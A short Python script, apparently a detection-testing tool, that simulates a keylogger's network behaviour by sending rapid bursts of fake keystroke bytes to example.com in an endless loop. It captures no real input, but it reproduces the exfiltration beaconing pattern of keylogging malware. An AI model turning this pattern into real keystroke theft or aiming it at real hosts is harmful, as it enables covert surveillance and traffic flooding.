import socket
import time
import random

TARGET_IP = "example.com"   # harmless, responds
TARGET_PORT = 80            # HTTP
INTERVAL = 0.1              # aggressive
BURST_SIZE = 20             # packets per burst

print("[*] Keylogger behavior simulator v2 started")

def send_burst():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((TARGET_IP, TARGET_PORT))

        for _ in range(BURST_SIZE):
            payload = random.choice([
                b"a", b"b", b"c", b"enter", b"space"
            ])
            sock.send(payload)
            time.sleep(0.01)

        sock.recv(1024)  # receive response
        sock.close()

    except Exception:
        pass

try:
    while True:
        send_burst()
        time.sleep(INTERVAL)

except KeyboardInterrupt:
    print("\n[*] Simulator stopped safely")

